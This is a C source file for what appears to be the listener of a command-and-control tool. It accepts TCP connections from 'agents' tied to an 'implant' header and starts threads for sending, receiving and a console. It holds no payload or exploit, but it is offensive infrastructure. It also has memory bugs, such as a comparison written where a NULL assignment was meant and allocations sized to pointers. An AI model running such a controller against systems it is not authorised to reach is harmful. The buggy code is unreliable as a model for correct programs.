/*
listener.c

This is the main file for the listener. It will do the following:
* spawn threads
* create the listening socket
* listen for new agents to connect

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <pthread.h>
#include <poll.h>
#include <stdbool.h>
#include <signal.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "base.h"
#include "listener_comms.h"
#include "console.h"
#include "message_handler.h"

#define FDSIZE			100
#define LISTEN_BACKLOG	3
#define BUFFER_SIZE		256
#define AGENT_TIMEOUT	60
#define DEFAULT_PORT	55555
#define CHECK_ALIVE_FREQUENCY	10

// Globals
// Socket Poll Structure
implant_poll *poll_struct;
pthread_mutex_t poll_lock;
// Receive Queue
Queue* listener_receive_queue;
pthread_mutex_t listener_receive_queue_lock;
// Send Queue
Queue* listener_send_queue;
pthread_mutex_t listener_send_queue_lock;
// Agent array
Agent* agents[FDSIZE] = {0}; 
// Alarm flag
volatile sig_atomic_t listener_alive_flag = false;

void listener_alive_alarm(int sig){
	listener_alive_flag = true;
}

void *check_alive(void *vargp){
	signal(SIGALRM, listener_alive_alarm);
	alarm(CHECK_ALIVE_FREQUENCY);
	for (;;){
		sleep(1);
		if (listener_alive_flag){
			for (int i = 0; i < FDSIZE; i++){
				if (agents[i] && agents[i]->alive + AGENT_TIMEOUT < time(NULL)){
					printf("Agent %d timeout, removing from poll\n", i);
					close(i);
					poll_delete(i);
					free(agents[i]);
					agents[i] == NULL;
				}
			}
			
			listener_alive_flag = false;
			alarm(CHECK_ALIVE_FREQUENCY);
		}
	}
	return 0;	
}

int start_sockets(int port){
    int sockfd, new_socket;
    int opt = 1;
    struct sockaddr_in addr;
    char *buffer;
    socklen_t addr_len = sizeof(addr);

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        printf("Socket failed\n");
        return RET_ERROR;
    }

    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))){
        printf("setsockopt failed\n");
        return RET_ERROR;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0){
        printf("bind failed\n");
        return RET_ERROR;
    }

    if (listen(sockfd, LISTEN_BACKLOG) < 0){
        printf("listen failed\n");
        return RET_ERROR;
    }

    for (;;){
        if ((new_socket = accept(sockfd, (struct sockaddr*)&addr, &addr_len)) < 0){
            printf("accept failed\n");
            return RET_ERROR;
        }
        debug_print("Agent connected %d\n", new_socket);
        
        if (new_socket >= FDSIZE){
			printf("too many connections\n");
			close(new_socket);
			continue;
		}
        
        poll_add(new_socket);
        agents[new_socket] = malloc(sizeof(Agent));
        memset(agents[new_socket], 0, sizeof(Agent));
        agents[new_socket]->alive = time(NULL);
        agents[new_socket]->last_fragment_index = -1;
    }
    
    close(sockfd);
    return RET_OK;
}

#ifndef UNIT_TESTING
int main(int argc, char *argv[]){
    int opt;
    int port = DEFAULT_PORT;
    pthread_t agent_receive_tid, agent_send_tid, console_tid, message_handler_tid, check_alive_tid;
    struct pollfd *pfds;
    int fd_count = 0;
    int fd_size = FDSIZE;

    poll_struct = malloc(sizeof(poll_struct));
    pfds = malloc(sizeof(pfds) * fd_size);
    
    while((opt = getopt(argc, argv, "p:h")) != -1){
        switch(opt){
            case 'p':
                port = atoi(optarg);
                break;
            case 'h':
                printf("Help\n");
                return RET_OK;
            case '?':
                printf("Unknown argument %c\n", optopt);
                return RET_ERROR;
            case ':':
                printf("Missing argument %c\n", optopt);
                return RET_ERROR;
        }
    }
    
    poll_struct->fd_count = &fd_count;
    poll_struct->pfds = pfds;

    // Create receive queue
    listener_receive_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&listener_receive_queue_lock, NULL);
    // Create send queue
    listener_send_queue = createQueue(QUEUE_SIZE);
    pthread_mutex_init(&listener_send_queue_lock, NULL);

    // Start agent receive thread
    pthread_create(&agent_receive_tid, NULL, receive_from_agent, NULL);
    // Start agent send thread
    pthread_create(&agent_send_tid, NULL, send_to_agent, NULL);
    // Start console thread
    pthread_create(&console_tid, NULL, console, NULL);
    // Start message handler thread
    pthread_create(&message_handler_tid, NULL, handle_message, NULL);
    // Start keep alive thread
    pthread_create(&check_alive_tid, NULL, check_alive, NULL);

    start_sockets(port);
    return RET_OK;
}
#endif /* UNIT_TESTING */


